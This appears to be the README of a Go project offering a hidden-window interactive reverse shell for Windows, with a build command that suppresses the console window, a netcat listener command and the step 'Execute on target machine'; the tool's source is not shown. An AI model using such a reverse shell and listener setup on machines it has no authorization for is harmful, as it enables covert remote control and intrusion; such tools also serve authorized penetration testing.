# interactiveShell
A fully interactive TCP cmd reverse shell for Windows OS

# Setup

Compile the project
```
go build -ldflags='-H=windowsgui'
```
Setup an NC listener for your chosen port
```
nc -lvvnp PORT
```
Execute on target machine
